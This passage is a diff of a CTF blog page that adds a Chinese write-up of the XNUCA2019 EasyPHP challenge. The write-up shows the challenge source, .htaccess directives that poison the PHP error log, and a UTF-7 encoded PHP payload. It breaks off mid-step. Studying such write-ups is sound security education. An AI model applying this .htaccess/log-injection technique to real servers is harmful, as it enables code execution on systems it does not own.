@@ -3,25 +3,21 @@
 <head>
   <meta charset="utf-8">
   <title>XNUCA2019Qualifier-EasyPHP | MIXBP</title>
-  <meta name="keywords" content=" .htaccess ">
+  <meta name="keywords" content=" .htaccess利用 , error_log结合log_errors自定义错误日志 , .htaccess配置prce绕过正则匹配 ">
   <meta name="description" content="XNUCA2019Qualifier-EasyPHP | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="NewStarCTF2023公开赛道-include0。0源码 12345678910&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; FLAG in the flag.php$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;&#x2F;base|rot&#x2F;i&#x27;,$file)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NewStarCTF2023公开赛道-include00">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/05/20/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00/index.html">
+<meta property="og:title" content="CISCN2024-WEB-easycms">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/05/25/CISCN2024-WEB-easycms/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="NewStarCTF2023公开赛道-include0。0源码 12345678910&lt;?phphighlight_file(__FILE__);&#x2F;&#x2F; FLAG in the flag.php$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;&#x2F;base|rot&#x2F;i&#x27;,$file)">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00-1.png">
-<meta property="article:published_time" content="2025-05-20T10:37:34.000Z">
-<meta property="article:modified_time" content="2025-05-20T13:45:59.925Z">
+<meta property="article:published_time" content="2025-05-25T11:56:05.000Z">
+<meta property="article:modified_time" content="2025-05-25T11:57:40.600Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="php伪协议">
-<meta property="article:tag" content="filter伪协议变种">
-<meta property="article:tag" content="二次编码绕过">
+<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="302跳转">
+<meta property="article:tag" content="反弹shell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -120,7 +116,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(139)</small>
+                <small>(145)</small>
             
         </div>
     </li>
@@ -147,7 +143,7 @@
         <div data-rel="刷题笔记">
             
             刷题笔记
-            <small>(22)</small>
+            <small>(27)</small>
         </div>
         
     </li>
@@ -162,7 +158,7 @@
         <div data-rel="比赛复现">
             
             比赛复现
-            <small>(5)</small>
+            <small>(6)</small>
         </div>
         
     </li>
@@ -200,8 +196,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="139">
-<input type="hidden" id="yelog_site_word_count" value="239.4k">
+<input type="hidden" id="yelog_site_posts_number" value="145">
+<input type="hidden" id="yelog_site_word_count" value="246.7k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -255,7 +251,11 @@
             </li>
         
             <li class="article-tag-list-item">
-                <i class="iconfont icon-tag"></i><a>.htaccess</a>
+                <i class="iconfont icon-tag"></i><a>.htaccess利用</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>.htaccess配置prce绕过正则匹配</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -292,6 +292,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>16进制加SQL预处理绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>302跳转</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -375,6 +379,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>环境变量</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>截断绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>经典盲文</a>
             </li>
         
@@ -427,6 +439,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>任意文件下载</a>
             </li>
         
@@ -468,6 +484,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>双大括号过滤</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>双写绕过../过滤</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -583,6 +603,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>长度限制绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>正则表达式</a>
             </li>
         
@@ -695,6 +719,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>error_log结合log_errors自定义错误日志</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>Error/Exception</a>
             </li>
         
@@ -772,6 +800,14 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>handler读表</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hash_hmac绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hex编码绕过</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -863,6 +899,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mysql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>MySQL</a>
             </li>
         
@@ -924,6 +964,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>PHP_SESSION_UPLOAD_PROGRESS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php-r</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1076,6 +1120,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>SoapClient类进行SSRF</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1239,8 +1287,62 @@
         
         
         <a  class="All 刷题笔记 "
+           href="/2025/05/25/CISCN2024-WEB-easycms/"
+           data-tag="ssrf,302跳转,反弹shell"
+           data-author="" >
+            <span class="post-title" title="CISCN2024-WEB-easycms">CISCN2024-WEB-easycms</span>
+            <span class="post-date" title="2025-05-25 19:56:05">2025/05/25</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Blackcat/"
+           data-tag="代码审计,RCE,环境变量,hash_hmac绕过"
+           data-author="" >
+            <span class="post-title" title="羊城杯2020-Blackcat">羊城杯2020-Blackcat</span>
+            <span class="post-date" title="2025-05-23 20:50:09">2025/05/23</span>
+        </a>
+        
+        
+        <a  class="All 比赛复现 "
+           href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
+           data-tag="ssti,ssrf,RCE,sql"
+           data-author="" >
+            <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
+            <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/22/NESTCTF2019-LoveMath2/"
+           data-tag="RCE,长度限制绕过,异或绕过"
+           data-author="" >
+            <span class="post-title" title="NESTCTF2019-LoveMath2">NESTCTF2019-LoveMath2</span>
+            <span class="post-date" title="2025-05-22 20:28:03">2025/05/22</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/21/virink-2019-files-share/"
+           data-tag="任意文件读取,双写绕过../过滤"
+           data-author="" >
+            <span class="post-title" title="virink_2019_files_share">virink_2019_files_share</span>
+            <span class="post-date" title="2025-05-21 21:42:07">2025/05/21</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/21/CISCN2024-WEB-simple-php/"
+           data-tag="反弹shell,php-r,截断绕过,hex编码绕过,session文件包含,mysql"
+           data-author="" >
+            <span class="post-title" title="CISCN2024-WEB-simple_php">CISCN2024-WEB-simple_php</span>
+            <span class="post-date" title="2025-05-21 20:42:58">2025/05/21</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
            href="/2025/05/20/XNUCA2019Qualifier-EasyPHP/"
-           data-tag=".htaccess"
+           data-tag=".htaccess利用,error_log结合log_errors自定义错误日志,.htaccess配置prce绕过正则匹配"
            data-author="" >
             <span class="post-title" title="XNUCA2019Qualifier-EasyPHP">XNUCA2019Qualifier-EasyPHP</span>
             <span class="post-date" title="2025-05-20 21:42:14">2025/05/20</span>
@@ -1267,7 +1369,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/05/20/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/"
-           data-tag="文件包含,php代码审计,getshell,php伪协议,二次编码绕过,提权"
+           data-tag="文件包含,getshell,php代码审计,php伪协议,二次编码绕过,提权"
            data-author="" >
             <span class="post-title" title="羊城杯2020-Easyphp2">羊城杯2020-Easyphp2</span>
             <span class="post-date" title="2025-05-20 17:39:03">2025/05/20</span>
@@ -1276,7 +1378,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="python反序列化,外带数据,pickle反序列化,反弹shell"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -1492,7 +1594,7 @@
         
         <a  class="All "
            href="/2025/04/25/N1CTF2018-eating-cms/"
-           data-tag="代码审计,文件包含,信息搜集,文件上传,rce,parse_url绕过,parse_str绕过"
+           data-tag="代码审计,信息搜集,文件包含,文件上传,rce,parse_url绕过,parse_str绕过"
            data-author="" >
             <span class="post-title" title="N1CTF2018-eating_cms">N1CTF2018-eating_cms</span>
             <span class="post-date" title="2025-04-25 20:43:52">2025/04/25</span>
@@ -1600,7 +1702,7 @@
         
         <a  class="All "
            href="/2025/04/19/MakePHPGreatAgain/"
-           data-tag="require_once,session文件包含,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
+           data-tag="session文件包含,require_once,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
            data-author="" >
             <span class="post-title" title="MakePHPGreatAgain">MakePHPGreatAgain</span>
             <span class="post-date" title="2025-04-19 20:29:51">2025/04/19</span>
@@ -1663,7 +1765,7 @@
         
         <a  class="All "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="刷题笔记,php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="刷题笔记,代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -1681,7 +1783,7 @@
         
         <a  class="All 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,upload,时间盲注,RCE,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,时间盲注,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -1717,7 +1819,7 @@
         
         <a  class="All "
            href="/2025/04/14/SUCTF2019-EasyWeb/"
-           data-tag="文件上传,.haccess,无字母数字RCE,异或绕过"
+           data-tag="文件上传,异或绕过,.haccess,无字母数字RCE"
            data-author="" >
             <span class="post-title" title="SUCTF2019-EasyWeb">SUCTF2019-EasyWeb</span>
             <span class="post-date" title="2025-04-14 17:33:10">2025/04/14</span>
@@ -1924,7 +2026,7 @@
         
         <a  class="All "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="刷题笔记,代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
+           data-tag="刷题笔记,swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -1960,7 +2062,7 @@
         
         <a  class="All "
            href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"
-           data-tag="刷题笔记,无字母数字RCE,异或绕过,取反绕过"
+           data-tag="刷题笔记,异或绕过,无字母数字RCE,取反绕过"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-RCE-ME">极客大挑战2019-RCE-ME</span>
             <span class="post-date" title="2025-03-29 01:33:00">2025/03/29</span>
@@ -2140,7 +2242,7 @@
         
         <a  class="All "
            href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
-           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
+           data-tag="刷题笔记,sql注入,ssrf,php反序列化"
            data-author="" >
             <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
             <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
@@ -2526,19 +2628,23 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">.htaccess</a>
+            <a class="color2">.htaccess利用</a>
+            
+            <a class="color4">error_log结合log_errors自定义错误日志</a>
+            
+            <a class="color2">.htaccess配置prce绕过正则匹配</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-05-20 21:46:11'>2025-05-20 21:42</time>
+            Created At : <time class="date" title='Updated At: 2025-05-21 20:39:44'>2025-05-20 21:42</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2</span>
+        <span>Count:2.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -2568,7 +2674,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="toc-text">XNUCA2019Qualifier-EasyPHP</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="toc-text">XNUCA2019Qualifier-EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-error-log%E7%BB%93%E5%90%88log-errors%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97"><span class="toc-text">解法一 error_log结合log_errors自定义错误日志</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81error-log%E7%BB%93%E5%90%88log-errors%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97"><span class="toc-text">1、error_log结合log_errors自定义错误日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81include-path%E8%AE%BE%E7%BD%AE%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84"><span class="toc-text">2、include_path设置包含路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81php-value-zend-multibyte-1%E7%BB%93%E5%90%88php-value-zend-script-encoding-%E2%80%9CUTF-7%E2%80%9D%E7%BB%95%E8%BF%87%E5%B0%96%E6%8B%AC%E5%8F%B7"><span class="toc-text">3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81-%E7%BB%95%E8%BF%87-htaccesss%E4%B8%AD%E7%9A%84%E5%A4%9A%E4%BD%99%E5%AD%97%E7%AC%A6"><span class="toc-text">4、# \绕过.htaccesss中的多余字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0"><span class="toc-text">payload构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-htaccess%E9%85%8D%E7%BD%AEprce%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-text">解法二 .htaccess配置prce绕过正则匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0-1"><span class="toc-text">payload构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89-htaccess%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">解法三 .htaccess文件包含</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2584,7 +2690,122 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="XNUCA2019Qualifier-EasyPHP"></a>XNUCA2019Qualifier-EasyPHP</h1>
+        <h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="XNUCA2019Qualifier-EasyPHP"></a>XNUCA2019Qualifier-EasyPHP</h1><p>参考博客：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11740901.html">https://www.cnblogs.com/20175211lyz/p/11740901.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14998652.html">https://www.cnblogs.com/Article-kelp/p/14998652.html</a></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;fl3g.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nJust one chance&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>代码审计：</p>
+<p>首先会对当前访问的php页面文件（index.php）所在的文件夹进行遍历，获取当前目录下的文件名和文件夹名，然后删除不为”index.php”的其他文件。</p>
+<p>包含文件fl3g.php，如果未使用GET方式对参数content和参数filename传值则显示当前PHP文件源码并结束程序。</p>
+<p>接收GET方式对参数content传值，并赋值给变量content，对content的值进行检测，如果含有”on”,”html”,”type”,”flag”,”upload”,”file”则会结束程序。</p>
+<p>接收GET方式对参数filename传值，并赋值给变量filename，并限制filename的值仅能使用小写字符和符号”.”，如果含有其他字符则会结束程序。</p>
+<p>再次对非”index.php”的其他文件进行删除</p>
+<p>将变量filename作为文件名，变量content拼接上字符串”\nJust one chance”后作为文件内容写入该文件</p>
+<hr>
+<p>这里尝试了下不能直接传入一句话木马的shell。因为传入的文件不会被正常当成PHP文件来解析。随后在对应的源代码配置中发现，设定了只能访问目录下的index.php时PHP引擎才会开启。</p>
+<p><img src="/../image/XNUCA2019Qualifier-EasyPHP-1.png"></p>
+<p>这题和之前有道题一样需要传入.htaccess文件。看了wp发现有三种解法。之前那道相似的题的payload也可以用在这，但是是非预期解</p>
+<h2 id="解法一-error-log结合log-errors自定义错误日志"><a href="#解法一-error-log结合log-errors自定义错误日志" class="headerlink" title="解法一 error_log结合log_errors自定义错误日志"></a>解法一 error_log结合log_errors自定义错误日志</h2><h3 id="1、error-log结合log-errors自定义错误日志"><a href="#1、error-log结合log-errors自定义错误日志" class="headerlink" title="1、error_log结合log_errors自定义错误日志"></a><strong>1、error_log结合log_errors自定义错误日志</strong></h3><p><strong>.htaccess文件中可以自己定义error_log，更多配置可以在<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表</a>找到</strong></p>
+<p> <strong>error_log是依靠出现错误来触发写日志的，所以最好让error_log把所有等级的错误均写成日志，这样方便我们写入，而error_reporting就能设置写日志需要的错误等级。</strong></p>
+<p><strong>其中当参数为32767时，表示为所有等级的错误。</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> include_path <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-attribute">php_value</span> error_reporting <span class="hljs-number">32767</span><br><span class="hljs-attribute">php_value</span> error_log /tmp/fl3g.php<br></code></pre></td></tr></table></figure>
+
+<p>只要我们填入一个不存在的路径就可以实现报错，然后就可以做到将报错信息中的payload，如:<br><code>[Fri Oct 25 17:44:29.533900 2019] [php7:warn] [pid 1387] [client 172.20.10.2:1147] PHP Warning: include_once(): Failed opening &#39;fl3g.php&#39; for inclusion (include_path=&#39;.:/usr/share/php&#39;) in /var/www/html/ctf/index.php on line 10</code></p>
+<p>这里的包含路径我们用shellcode代替，这样就能在我们指定的报错日志文件（&#x2F;tmp&#x2F;fl3g.php）中写入shellcode。</p>
+<p><strong>仅三个目录有增删文件的权限，这三个目录分别是&#x2F;tmp&#x2F;、&#x2F;var&#x2F;tmp&#x2F;和&#x2F;var&#x2F;www&#x2F;html&#x2F;(即我们当前储存PHP代码的文件夹)，其他目录由于没有增删文件的权限所以我们error_log也因无法在这些目录下创建日志文件而失效(对于tmp文件夹或许是出于临时储存的需求所以需要的权限较低?并没有找到关于这点相关资料，但看wp都选择了&#x2F;tmp&#x2F;)。</strong></p>
+<h3 id="2、include-path设置包含路径"><a href="#2、include-path设置包含路径" class="headerlink" title="2、include_path设置包含路径"></a><strong>2、include_path设置包含路径</strong></h3><p>.htaccess可以设置<code>php_value include_path &quot;xxx&quot;</code>将<code>include()</code>的默认路径改变</p>
+<h3 id="3、php-value-zend-multibyte-1结合php-value-zend-script-encoding-“UTF-7”绕过尖括号"><a href="#3、php-value-zend-multibyte-1结合php-value-zend-script-encoding-“UTF-7”绕过尖括号" class="headerlink" title="3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤"></a><strong>3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤</strong></h3><p><strong>我们的payload并不可直接使用，在写入日志时符号”&lt;”与”&gt;”被进行了HTML转义，我们的php代码也就不会被识别。</strong></p>
+<p><img src="/../image/XNUCA2019Qualifier-EasyPHP-2.png"></p>
+<p>这里使用utf-7编码绕过。</p>
+<p>参考[l33t-hoster](<a target="_blank" rel="noopener" href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack</a> 2019&#x2F;l33t-hoster&#x2F;l33t-hoster.md)</p>
+<p>写入utf-7编码的shellcode可以绕过<code>&lt;?</code>的过滤<br><code>+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs</code></p>
+<p>需要在.htaccess中配置解析的编码：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">php_value zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span><br>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>zend.multibyte决定是否开启编码的检测和解析</p>
+<p>zend.script_encoding决定采用什么编码</p>
+<h3 id="4、-绕过-htaccesss中的多余字符"><a href="#4、-绕过-htaccesss中的多余字符" class="headerlink" title="4、# \绕过.htaccesss中的多余字符"></a>4、<code># \</code>绕过.htaccesss中的多余字符</h3><p>由于源码会在我们的payload后添加<code>\nJust one chance</code>，这会导致我们的.htaccess文件解析出错，无法发挥作用。</p>
+<p>直接写入会变成这样：</p>
